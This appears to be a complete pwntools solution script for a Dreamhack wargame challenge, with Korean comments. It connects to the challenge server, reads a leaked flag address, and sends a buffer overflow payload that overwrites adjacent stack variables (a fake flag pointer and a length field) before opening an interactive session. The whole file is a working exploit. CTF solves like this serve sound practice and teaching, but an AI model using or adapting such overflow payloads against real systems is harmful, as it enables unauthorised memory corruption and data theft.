#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = remote("host3.dreamhack.games", 18953)

p.recvuntil(b'real flag address (mmapped address): ')
real_flag_addr = int(p.recvuntil(b'\n'), 16)

# 공격 페이로드
payload = b''
payload += b'A'*32			# buf 채우기
payload += b'\x00'*8			# dummy 채우기
payload += p64(real_flag_addr)		# real_flag_addr 채우기
payload += p64(real_flag_addr)		# fake_flag_addr을 real_flag_addr로 변조
payload += p32(0x0)			# len을 0으로 변조

p.recvuntil(b'input: ')
# 페이로드 전송
p.sendline(payload)

p.interactive()
